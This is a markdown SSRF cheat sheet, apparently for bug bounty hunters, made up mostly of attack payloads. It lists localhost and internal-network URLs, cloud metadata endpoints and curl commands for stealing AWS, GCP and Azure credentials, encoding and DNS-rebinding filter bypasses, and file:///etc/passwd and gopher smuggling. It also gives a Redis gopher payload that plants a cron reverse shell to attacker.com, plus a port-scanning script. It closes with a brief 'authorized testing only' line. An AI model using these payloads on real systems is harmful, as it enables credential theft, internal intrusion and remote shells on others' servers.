# 🌐 SSRF - Server-Side Request Forgery

```
  ███████╗███████╗██████╗ ███████╗
  ██╔════╝██╔════╝██╔══██╗██╔════╝
  ███████╗███████╗██████╔╝█████╗  
  ╚════██║╚════██║██╔══██╗██╔══╝  
  ███████║███████║██║  ██║██║     
  ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     
   Server-Side Request Forgery
```

<p align="center">
  <img src="https://img.shields.io/badge/SSRF-Internal_Access-red?style=for-the-badge" alt="SSRF">
  <img src="https://img.shields.io/badge/Cloud-Metadata-blue?style=for-the-badge" alt="Cloud">
  <img src="https://img.shields.io/badge/Bug_Bounty-green?style=for-the-badge" alt="Bug Bounty">
</p>

---

## 🎯 What is SSRF

**SSRF** allows an attacker to make the server perform requests to unintended locations, potentially accessing internal services or cloud metadata.

### Impact
- 🔴 **Internal Network Access** - Scan internal services
- 🔴 **Cloud Metadata** - Steal AWS/GCP credentials
- 🔴 **Bypass Firewalls** - Access protected resources
- 🔴 **RCE** - In some cases leads to code execution

---

## 🔍 Where to Look

### Common Parameters
```
url=
uri=
path=
dest=
redirect=
redirect_uri=
next=
data=
reference=
site=
html=
val=
validate=
domain=
callback=
return=
page=
feed=
host=
port=
to=
out=
view=
dir=
```

### Common Vulnerable Functions
```
- URL fetchers/validators
- PDF generators
- Image processors
- File imports
- Webhooks
- API integrations
- Web scrapers
- Screenshot services
```

---

## 💉 Basic Payloads

### Localhost
```
http://localhost
http://localhost:80
http://localhost:443
http://localhost:22
http://127.0.0.1
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1
http://0.0.0.0
http://0
http://[::1]
http://[0000::1]
```

### Internal Networks
```
# Class A
http://10.0.0.1
http://10.10.10.10
http://10.255.255.255

# Class B
http://172.16.0.1
http://172.31.255.255

# Class C
http://192.168.0.1
http://192.168.1.1
http://192.168.255.255

# Link-local
http://169.254.169.254
```

### Common Ports
```
http://127.0.0.1:21    # FTP
http://127.0.0.1:22    # SSH
http://127.0.0.1:23    # Telnet
http://127.0.0.1:25    # SMTP
http://127.0.0.1:80    # HTTP
http://127.0.0.1:443   # HTTPS
http://127.0.0.1:3306  # MySQL
http://127.0.0.1:5432  # PostgreSQL
http://127.0.0.1:6379  # Redis
http://127.0.0.1:27017 # MongoDB
http://127.0.0.1:8080  # Alt HTTP
http://127.0.0.1:9200  # Elasticsearch
```

---

## ☁️ Cloud Metadata

### AWS
```
# Instance metadata (IMDSv1)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# Specific data
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4
```

### Google Cloud (GCP)
```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/project/

# With header required
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01

# Requires header
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
```

---

## 🛡️ Bypass Techniques

### IP Address Formats
```
# Decimal
http://2130706433  # = 127.0.0.1
http://3232235521  # = 192.168.0.1

# Hex
http://0x7f000001  # = 127.0.0.1
http://0x7f.0x0.0x0.0x1

# Octal
http://0177.0.0.01  # = 127.0.0.1
http://0177.0.0.0

# Mixed
http://127.1
http://127.0.1
http://0
```

### URL Encoding
```
http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
http://localhost → http://%6c%6f%63%61%6c%68%6f%73%74

# Double encoding
http://%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34
```

### DNS Rebinding
```
# Use services like:
# - spoofed.burpcollaborator.net
# - 7f000001.rbndr.us  → 127.0.0.1
# - 1.localtest.me → 127.0.0.1

# Setup custom DNS
your-domain.com → 127.0.0.1
```

### URL Parsing Issues
```
# @ trick
http://attacker.com@127.0.0.1
http://127.0.0.1#@attacker.com
http://127.0.0.1?@attacker.com
http://attacker.com\@127.0.0.1

# Fragments
http://127.0.0.1#.attacker.com
http://127.0.0.1?.attacker.com

# Backslash
http://attacker.com\127.0.0.1
```

### Protocol Smuggling
```
# File
file:///etc/passwd
file://127.0.0.1/etc/passwd

# Gopher
gopher://127.0.0.1:6379/_INFO

# Dict
dict://127.0.0.1:6379/INFO

# LDAP
ldap://127.0.0.1:389

# TFTP
tftp://127.0.0.1/file.txt
```

### Open Redirect Chain
```
# If site has open redirect:
https://target.com/redirect?url=http://169.254.169.254/

# Redirect to internal
http://target.com/redirect?url=http://127.0.0.1:8080
```

### IPv6 Bypass
```
http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[::ffff:127.0.0.1]
http://[::]
```

### Header Injection
```
# CRLF injection in URL
http://attacker.com%0d%0aHost:%20127.0.0.1%0d%0a
```

---

## 🔥 Exploitation

### Redis RCE via Gopher
```
# Generate payload
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a
*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1
%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

### HTTP Request Smuggling
```
gopher://127.0.0.1:80/_POST%20/internal/admin%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2020%0d%0a%0d%0acommand=id
```

### Port Scanning
```python
import requests

target = "https://vulnerable.com/fetch?url="
ports = [21, 22, 23, 25, 80, 443, 3306, 6379, 8080]

for port in ports:
    url = f"{target}http://127.0.0.1:{port}"
    r = requests.get(url, timeout=5)
    if "connection refused" not in r.text.lower():
        print(f"[OPEN] Port {port}")
```

---

## 📊 Quick Reference

### Detection
```
# Test for SSRF
?url=http://burpcollaborator.net
?url=http://webhook.site/xxxx

# Check response
- DNS query received?
- HTTP request received?
- Different response for internal IPs?
```

### Impact Levels

| Target | Impact |
|--------|--------|
| Cloud Metadata | Critical - Credential theft |
| Internal APIs | High - Data access |
| Internal Services | High - Potential RCE |
| Port Scanning | Medium - Information disclosure |

### Common Filters & Bypasses

| Filter | Bypass |
|--------|--------|
| Block `localhost` | Use `127.0.0.1`, `0`, `[::1]` |
| Block `127.0.0.1` | Use decimal `2130706433` |
| Block private IPs | Use DNS rebinding |
| HTTP only | Try `gopher://`, `file://` |
| Whitelist domain | Use `@` trick, open redirect |

---

## 🛠️ Tools

```bash
# SSRFmap
python3 ssrfmap.py -r request.txt -p url -m readfiles

# Gopherus (Gopher payload generator)
python gopherus.py --exploit redis

# Collaborator/webhook for blind SSRF
# - Burp Collaborator
# - webhook.site
# - requestbin.com
```

---

## 📚 Resources

- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [SSRF Bible](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

---

<p align="center">
  <b>🌐 Exploit SSRF!</b><br>
  <i>For authorized testing only!</i>
</p>
